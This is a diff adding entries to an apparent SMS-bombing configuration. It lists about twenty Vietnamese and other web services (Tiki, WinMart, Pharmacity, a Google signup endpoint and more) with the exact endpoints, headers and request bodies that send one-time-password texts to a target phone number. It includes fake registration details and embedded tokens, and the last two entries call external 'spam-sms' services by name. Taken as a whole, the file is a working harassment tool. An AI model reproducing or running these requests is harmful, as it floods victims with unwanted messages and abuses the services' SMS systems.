+      "url": "https://concung.com/ajax.html",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "ajax": "1",
+        "classAjax": "AjaxLogin",
+        "methodAjax": "sendOtpLogin",
+        "customer_phone": "{phone}",
+        "id_customer": "0",
+        "momoapp": "0",
+        "back": "khach-hang.html"
+      },
+      "enabled": true
+    },
+    {
+      "name": "gotadi",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phoneNumber": "{phone}",
+        "language": "VI"
+      },
+      "enabled": true
+    },
+    {
+      "name": "winmart_web",
+      "market": "vn",
+      "method": "GET",
+      "url": "https://api-crownx.winmart.vn/as/api/web/v1/send-otp",
+      "headers": {
+        "Accept": "application/json"
+      },
+      "params": {
+        "phoneNo": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "winmart_iam",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api-crownx.winmart.vn/iam/api/v1/user/register",
+      "headers": {
+        "Content-Type": "application/json",
+        "x-api-merchant": "WCM"
+      },
+      "json": {
+        "firstName": "Nguyen Van A",
+        "phoneNumber": "{phone}",
+        "masanReferralCode": "",
+        "dobDate": "2000-02-05",
+        "gender": "Male"
+      },
+      "enabled": true
+    },
+    {
+      "name": "atmonline",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "mobilePhone": "{phone}",
+        "source": "ONLINE"
+      },
+      "enabled": true
+    },
+    {
+      "name": "gkitchen",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://stagingapi.gkitchen.com.vn/v1/auth/registerSendCodeOTP",
+      "headers": {
+        "Content-Type": "application/json;charset=UTF-8",
+        "clientid": "0",
+        "hashcode": "288d73810e5c7231e115d656de7fea9d",
+        "versionapp": "Web GKitchen 2.0"
+      },
+      "json": {
+        "phone": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "pharmacity",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api-gateway.pharmacity.vn/customers/register/otp",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phone": "{phone}",
+        "referral": ""
+      },
+      "enabled": true
+    },
+    {
+      "name": "tiki",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://tiki.vn/api/v2/customers/otp_codes",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phone_number": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "google",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://accounts.google.com/_/signup/sendidv",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
+      },
+      "form": {
+        "f.req": "[\"TL:abc\",null,\"{phone}\",\"vn\",3,null,1,0,[],0,1]"
+      },
+      "enabled": true
+    },
+    {
+      "name": "medpro",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api-v2.medpro.com.vn/user/phone-register",
+      "headers": {
+        "Content-Type": "application/json;charset=UTF-8",
+        "appid": "medpro",
+        "partnerid": "medpro",
+        "platform": "pc"
+      },
+      "json": {
+        "fullname": "nguoi dung medpro",
+        "deviceId": "1a27c3f208891176783815134edea038",
+        "phone": "{phone}",
+        "type": "password"
+      },
+      "enabled": true
+    },
+    {
+      "name": "best_express",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://v9-cc.800best.com/uc/account/sendsignupcode",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phoneNumber": "{phone}",
+        "verificationCodeType": 1
+      },
+      "enabled": true
+    },
+    {
+      "name": "onlandtech",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://onlandtech.vn/register",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "form": {
+        "_token": "mQjcMdKuL8CmNjg65NLSgi3flcxnXYuBCQdXDmpX",
+        "user_type": "bidder",
+        "name": "le van an",
+        "phone": "{phone}",
+        "email": "",
+        "password": "Abc@12345",
+        "password_confirmation": "Abc@12345",
+        "tax": "",
+        "tax_date": "2000-01-01",
+        "tax_address": "tp HCM",
+        "presenter": ""
+      },
+      "enabled": true
+    },
+    {
+      "name": "meeyland",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://v3.meeyid.com/auth/v4.1/register-with-phone",
+      "headers": {
+        "Content-Type": "application/json",
+        "x-client-id": "meeyland"
+      },
+      "json": {
+        "phone": "{phone}",
+        "phoneCode": "+84",
+        "refCode": ""
+      },
+      "enabled": true
+    },
+    {
+      "name": "y360",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://y360.vn/api/v1/user/register",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phone": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "nh247",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://www.nhaphang247.com/site/get-code",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "phone": "{phone}",
+        "token": ""
+      },
+      "enabled": true
+    },
+    {
+      "name": "daihocfpt",
+      "market": "vn",
+      "method": "GET",
+      "url": "https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php",
+      "headers": {
+        "Accept": "*/*"
+      },
+      "params": {
+        "resend_opt": "1",
+        "mobile": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "cafeland",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://nhadat.cafeland.vn/member-send-otp/",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "form": {
+        "mobile": "{phone}",
+        "_token": "bF6eZbKCCrOoXVKoixlRXzhTssc90B3KwRox2F4w"
+      },
+      "enabled": true
+    },
+    {
+      "name": "gbay",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phone_number": "{phone}",
+        "hash": "0000000000000000000000000000000000000000"
+      },
+      "enabled": true
+    },
+    {
+      "name": "apiv2_external",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://onlytrislua.x10.mx/s/user-spam-sms.php",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "form": {
+        "phone": "{phone}",
+        "server_id": "493",
+        "key": "TRTS"
+      },
+      "enabled": true
+    },
+    {
+      "name": "apiv3_external",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://onlytrislua.x10.mx/download/user-vip-spam-sms.php",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "form": {
+        "phone": "{phone}",
+        "ten_server": "Server-IPv2",
+        "key": "TRTS"
+      },
+      "enabled": true
+    }
+  ]
+}
